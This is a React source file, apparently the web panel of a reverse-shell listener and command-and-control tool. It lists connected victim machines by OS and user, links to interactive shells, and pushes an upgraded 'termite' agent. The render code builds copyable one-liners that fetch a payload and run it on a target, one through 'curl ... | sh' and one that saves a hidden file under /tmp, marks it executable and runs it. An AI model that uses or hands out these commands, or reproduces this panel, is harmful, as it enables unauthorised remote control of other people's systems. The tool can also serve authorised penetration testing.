import React from "react";
import {
  Alert,
  Button,
  Collapse,
  Descriptions,
  Divider,
  Input,
  Layout,
  List,
  message,
  Modal,
  Progress,
  Select,
  Table,
  Tabs,
  Tag,
  Tooltip,
} from "antd";

import Banner from "./components/Banner/Banner";
import SideBar from "./components/SideBar/SideBar";

import "./App.css";
import { CopyToClipboard } from "react-copy-to-clipboard";

const { Panel } = Collapse;
const axios = require("axios");
axios.defaults.headers.post["Content-Type"] =
  "application/x-www-form-urlencoded";
const { TabPane } = Tabs;
const { Option } = Select;
const moment = require("moment");
var W3CWebSocket = require("websocket").w3cwebsocket;
var randomstring = require("randomstring");
var filesize = require("filesize");

message.config({
  duration: 3,
  maxCount: 5,
  rtl: true,
});

const { Content } = Layout;

let endPoint = process.env.NODE_ENV === "development" ? "192.168.88.129:7331" : window.location.host;
let baseUrl = ["http://", endPoint].join("");
let apiUrl = [baseUrl, "/api"].join("");
let wsUrl = ["ws://", endPoint, "/notify"].join("");

class App extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      bottom: "bottomLeft",
      serversMap: null,
      serversList: [],
      isModalVisible: false,
      currentServer: null,
      connectBack: "",
      serverCreateHost: "0.0.0.0",
      serverCreatePort: Math.floor(Math.random() * 65536),
    };
    this.serverCreated = this.serverCreated.bind(this);
    this.selectServer = this.selectServer.bind(this);
  }

  upgradeToTermite(clientHash, target) {
    if (target !== "") {
      axios
        .get(apiUrl + "/client/" + clientHash + "/upgrade/" + target)
        .then((response) => {
          console.log(response)
        })
    } else {
      message.error("Invalid connect back termite listener address: " + target, 5);
    }
  }

  showModal() {
    this.setState({
      isModalVisible: true,
    });
  };

  handleOk(hash) {
    this.upgradeToTermite(hash, this.state.connectBack)
    this.setState({
      isModalVisible: false,
      connectBack: "",
    })
  };

  handleCancel() {
    this.setState({
      isModalVisible: false,
      connectBack: "",
    })
  };

  generateProgressStatus(prog) {
    if (prog < 0) {
      return "exception"
    } else if (prog === 0) {
      return "normal"
    } else if (prog > 0) {
      if (prog >= 100) {
        return "success"
      } else {
        return "active"
      }
    }
  }

  fetchData() {
    axios
      .get([apiUrl, "/server"].join(""))
      .then((response) => {
        if (Object.values(response.data.msg).length > 0) {
          this.setState({
            serversMap: response.data.msg.servers,
            serversList: Object.values(response.data.msg.servers),
            currentServer: Object.values(response.data.msg.servers)[0],
            distributor: response.data.msg.distributor
          });
        }
      })
      .catch((error) => {
        message.error("Cannot connect to API EndPoint: " + error, 5);
      });
  }

  componentDidMount() {
    let _this = this;
    _this.fetchData();

    var client = new W3CWebSocket(wsUrl);
    client.onerror = () => {
      // message.error("WebSocket connect failed!", 5);
    };
    client.onopen = () => {
      // message.success("WebSocket connected!", 5);
    };
    client.onmessage = (e) => {
      let CLIENT_CONNECTED = 0;
      let CLIENT_DUPLICATED = 1;
      let SERVER_DUPLICATED = 2;
      let COMPILING_TERMITE = 3;
      let COMPRESSING_TERMITE = 4;
      let UPLOADING_TERMITE = 5;

      let data = JSON.parse(e.data);

      let serverHash, clientHash, newServersMap

      switch (data.Type) {
        case CLIENT_CONNECTED:
          console.log(data);
          let onlinedClient = data.Data.Client;
          serverHash = data.Data.ServerHash;
          message.success(
            "New client connected from: " +
            onlinedClient.host +
            ":" +
            onlinedClient.port,
            5
          );

          newServersMap = this.state.serversMap;
          if (newServersMap[serverHash].encrypted) {
            newServersMap[serverHash].termite_clients[onlinedClient.hash] = onlinedClient;
          } else {
            newServersMap[serverHash].clients[onlinedClient.hash] = onlinedClient;
          }

          _this.setState({
            serversMap: newServersMap,
          });
          break;
        case CLIENT_DUPLICATED:
          let duplicatedClient = data.Data.Client;
          message.error(
            "Duplicated client connected from: " +
            duplicatedClient.host +
            ":" +
            duplicatedClient.port +
            ", connection reseted.",
            5
          );
          break;
        case SERVER_DUPLICATED:
          let duplicatedServer = data.Data;
          message.error(
            "Duplicated server: " +
            duplicatedServer.host +
            ":" +
            duplicatedServer.port,
            5
          );
          break;

        case COMPILING_TERMITE:
          let compilingProgress = data.Data;
          clientHash = compilingProgress.Client.hash;
          serverHash = compilingProgress.ServerHash;
          let cp = compilingProgress.Progress

          newServersMap = this.state.serversMap;
          newServersMap[serverHash].clients[clientHash].compiling_progress = cp
          if (newServersMap[serverHash].clients[clientHash].compiling_progress === 100) {
            newServersMap[serverHash].clients[clientHash].alert = "Compile sucessfully!"
          } else {
            newServersMap[serverHash].clients[clientHash].alert = "Compiling..."
          }

          _this.setState({
            serversMap: newServersMap,
          });
          break
        case COMPRESSING_TERMITE:
          let compressingProgress = data.Data;
          clientHash = compressingProgress.Client.hash;
          serverHash = compressingProgress.ServerHash;
          let p = compressingProgress.Progress

          newServersMap = this.state.serversMap;
          newServersMap[serverHash].clients[clientHash].compressing_progress = p

          if (newServersMap[serverHash].clients[clientHash].compressing_progress === 100) {
            newServersMap[serverHash].clients[clientHash].alert = "Compress successfully!"
          } else {
            newServersMap[serverHash].clients[clientHash].alert = "Compressing..."
          }

          _this.setState({
            serversMap: newServersMap,
          });
          break
        case UPLOADING_TERMITE:
          let uploadingProgress = data.Data;
          clientHash = uploadingProgress.Client.hash;
          serverHash = uploadingProgress.ServerHash;
          let bytesSent = uploadingProgress.BytesSent
          let bytesTotal = uploadingProgress.BytesTotal

          newServersMap = this.state.serversMap;
          newServersMap[serverHash].clients[clientHash].upload_progress = (bytesSent / bytesTotal) * 100;

          if (newServersMap[serverHash].clients[clientHash].upload_progress === 100) {
            newServersMap[serverHash].clients[clientHash].alert = "Upgrade successfully!"
          } else {
            newServersMap[serverHash].clients[clientHash].alert = filesize(bytesSent) + " / " + filesize(bytesTotal)
          }
          _this.setState({
            serversMap: newServersMap,
          });
          break;
        default:
          break;
      }
    };
    client.onclose = () => {
      message.error("WebSocket disconnected!", 5);
    };
  }

  serverCreated(newServer) {
    this.setState({
      serversList: [...this.state.serversList, newServer],
    });
    const newServersMap = this.state.serversMap;
    newServersMap[newServer.hash] = newServer;
    this.setState({
      serversMap: newServersMap,
      serverCreatePort: Math.floor(Math.random() * 65536),
    });
  }

  selectServer(hash) {
    this.setState({
      currentServer: this.state.serversMap[hash],
    });
  }

  render() {
    const columns = [
      {
        title: "Address",
        dataIndex: "host",
        key: "host",
        align: "center",
        render: (data, line, index) => {
          return (
            <Tooltip title={"Hash:" + line.hash}>
              <span>{line.host + ":" + line.port}</span>
            </Tooltip>
          );
        },
      },
      {
        title: "OS",
        dataIndex: "os",
        key: "os",
        align: "center",
        render: (data) => {
          switch (data) {
            case 1:
              return "Linux";
            case 2:
              return "Windows";
            case 3:
              return "SunOS";
            case 4:
              return "MacOS";
            case 5:
              return "FreeBSD";
            default:
              return "Unknown Operating System";
          }
        },
      },
      {
        title: "Username",
        dataIndex: "user",
        key: "user",
        align: "center",
        render: (data) => {
          let color = "green";
          if (data === "root") {
            color = "red";
          }
          return <Tag color={color}>{data}</Tag>;
        },
      },
      {
        title: "Online Time",
        dataIndex: "timestamp",
        key: "timestamp",
        align: "center",
        render: (data) => {
          return "Onlined at " + moment(data).fromNow();
        },
      },
      {
        title: "Action",
        key: "x",
        render: (data, line, index) => {
          let upgradeButton;
          if (line.CurrentProcessKey === undefined) {
            upgradeButton = <Button disabled={false} onClick={() => { this.showModal() }}>Upgrade</Button>
          } else {
            upgradeButton = ""
          }

          return (
            <>
              <Button>
                <a
                  href={baseUrl + "/shell/?" + line.hash}
                  target={"_blank"}
                  rel={"noreferrer noopener"}
                >
                  Shell
                </a>
              </Button>
              {upgradeButton}
              <Modal title="Basic Modal" visible={this.state.isModalVisible} onOk={() => this.handleOk(line.hash)} onCancel={() => this.handleCancel()}>
                Select Termite Listeners:
                <Select
                  showSearch
                  style={{ width: 200 }}
                  placeholder="Select an termite listener"
                  optionFilterProp="children"
                  onChange={(value) => {
                    this.setState({ connectBack: value });
                  }}
                  filterOption={(input, option) =>
                    option.children.toLowerCase().indexOf(input.toLowerCase()) >= 0
                  }
                  defaultValue={this.state.connectBack}
                >
                  {this.state.serversList.map((entry) => {
                    if (entry.encrypted) {
                      return entry.interfaces.map((ifaddr) => {
                        let v = ifaddr + ":" + entry.port
                        return <Option value={v}>{v}</Option>
                      })
                    }
                    return ""
                  })}
                </Select>
                Input Termite Listeners Manually:
                <Input placeholder="1.3.3.7:13337" value={this.state.connectBack} onChange={(e) => { this.setState({ connectBack: e.target.value }) }} />
              </Modal>
            </>
          );
        },
      },
      {
        title: "Progress",
        dataIndex: "upload_progress",
        key: "upload_progress",
        align: "center",
        render: (data, line, index) => {
          return <>
            <Alert message={line.alert === undefined ? "Press Upgrade to Proceed" : line.alert} type="success" />
            <Progress percent={line.compiling_progress} size="small" status={this.generateProgressStatus(line.compiling_progress)} />
            <Progress percent={line.compressing_progress} size="small" status={this.generateProgressStatus(line.compressing_progress)} />
            <Progress percent={Math.round(line.upload_progress)} size="small" status={this.generateProgressStatus(line.upload_progress)} />
          </>
        },
      }
    ];

    let hint;
    if (this.state.currentServer === null) {
      hint = (
        <Alert
          message="Warning"
          description="Please start and select a server"
          type="warning"
          showIcon
          closable
        />
      );
    } else {
      let hintTabs
      if (this.state.currentServer.encrypted) {
        hintTabs = <Tabs defaultActiveKey="0">
          {this.state.distributor.interfaces.map((value, index) => {
            let url = "http://" + value + ":" + this.state.distributor.port
            let command, filename, target
            let data = []
            Object.values(this.state.currentServer.interfaces).map((value, index) => {
              filename = "/tmp/." + randomstring.generate(4)
              target = value + ":" + this.state.currentServer.port
              command = "curl -fsSL " + url + "/termite/" + target + " -o " + filename + " && chmod +x " + filename + " && " + filename
              data.push({ target: value + ":" + this.state.currentServer.port, command: command })
              return command
            })

            let commands = <List
              size="small"
              header={<div>Termite oneline command</div>}
              footer={<div></div>}
              bordered
              dataSource={data}
              renderItem={item => <List.Item>
                {"Connect back: " + item.target}
                <Input addonAfter={<CopyToClipboard
                  text={item.command}
                  onCopy={() => this.setState({ copied: true })}
                >
                  <button>Click to copy</button>
                </CopyToClipboard>
                } defaultValue={item.command} />
              </List.Item>}
            />

            return (
              <TabPane tab={value} key={index}>
                {commands}
              </TabPane>
            );
          })}
        </Tabs>
      } else {
        hintTabs = <Tabs defaultActiveKey="0">
          {this.state.currentServer.interfaces.map((value, index) => {
            let command = "curl http://" + value + ":" + this.state.currentServer.port + "|sh"
            return (
              <TabPane tab={value} key={index}>
                <Tag>{command}</Tag>
                <CopyToClipboard
                  text={command}
                  onCopy={() => this.setState({ copied: true })}
                >
                  <button>Click to copy</button>
                </CopyToClipboard>
              </TabPane>
            );
          })}
        </Tabs>
      }
      hint = (
        <div>
          <Descriptions title="Server Info">
            <Descriptions.Item label="Address">
              {this.state.currentServer.host +
                ":" +
                this.state.currentServer.port}
            </Descriptions.Item>
            <Descriptions.Item label="Clients">
              {this.state.currentServer
                ? Object.keys(this.state.currentServer.clients).length + Object.keys(this.state.currentServer.termite_clients).length
                : 0}
            </Descriptions.Item>
            <Descriptions.Item label="Started">
              {moment(this.state.currentServer.timestamp).fromNow()}
            </Descriptions.Item>
          </Descriptions>
          <Collapse defaultActiveKey={["1"]}>
            <Panel
              header="Expand to show the reverse shell commands for the current server"
              key="1"
            >
              {hintTabs}
            </Panel>
          </Collapse>
        </div>
      );
    }

    let dataSource;
    let table;
    if (this.state.currentServer) {
      if (this.state.currentServer.encrypted) {
        dataSource = Object.values(this.state.currentServer.termite_clients)
        table = <Table
          columns={columns.slice(0, columns.length - 1)}
          pagination={{ position: [this.state.bottom] }}
          dataSource={dataSource}
        />
      } else {
        dataSource = Object.values(this.state.currentServer.clients)
        table = <Table
          columns={columns}
          pagination={{ position: [this.state.bottom] }}
          dataSource={dataSource}
        />
      }
    } else {
      dataSource = []
    }

    return (
      <Layout>
        <Banner></Banner>
        <Layout style={{ height: "100%" }}>
          <SideBar
            apiUrl={apiUrl}
            currentServer={this.state.currentServer}
            selectServer={this.selectServer}
            serverCreated={this.serverCreated}
            serverCreateHost={this.state.serverCreateHost}
            serverCreatePort={this.state.serverCreatePort}
            serversList={this.state.serversList}
            serversMap={this.state.serversMap}
          />
          <Layout style={{ padding: "0 24px 24px" }}>
            <Content style={{ margin: "0 0" }}>
              {hint}
              <Divider orientation="left"></Divider>
              {table}
            </Content>
          </Layout>
        </Layout>
      </Layout>
    );
  }
}

export default App;
